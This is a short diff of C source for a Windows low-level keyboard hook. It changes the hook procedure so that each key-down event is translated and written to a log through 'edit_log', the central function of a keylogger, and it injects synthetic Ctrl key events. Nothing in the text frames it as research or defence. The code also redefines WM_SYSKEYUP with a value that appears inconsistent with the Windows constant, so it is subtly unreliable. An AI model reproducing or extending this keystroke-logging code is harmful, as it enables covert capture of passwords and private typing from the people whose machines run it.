@@ -2,7 +2,7 @@
 # define WM_SYSKEYUP 257
 
 HHOOK hook;
-KBDLLHOOKSTRUCT keyboard_struct;
+KBDLLHOOKSTRUCT hook_struct;
 
 void StartKeyBoardHook()
 {
@@ -17,14 +17,14 @@ void StartKeyBoardHook()
 
 LRESULT __stdcall HookProcedure(int nCode, WPARAM wParam, LPARAM lParam)
 {
-	keyboard_struct = *((KBDLLHOOKSTRUCT*)lParam);
+	hook_struct = *((KBDLLHOOKSTRUCT*)lParam);
 	if (nCode >= 0)
 	{
 		if (wParam == WM_KEYDOWN)
-			analyse_keyboard_status(keyboard_struct.vkCode);
-		else if (wParam == WM_SYSKEYDOWN && keyboard_struct.vkCode != 126)
+			edit_log(translate_key_value(hook_struct.vkCode));
+		else if (wParam == WM_SYSKEYDOWN && hook_struct.vkCode != 165)
 			keybd_event(VK_CONTROL, 0, 0, 0);
-		else if (wParam == WM_SYSKEYUP && keyboard_struct.vkCode == 165)
+		else if (wParam == WM_SYSKEYUP && hook_struct.vkCode == 165)
 			keybd_event(VK_CONTROL, 0, KEYEVENTF_KEYUP, 0);
 	}
 	return CallNextHookEx(hook, nCode, wParam, lParam);
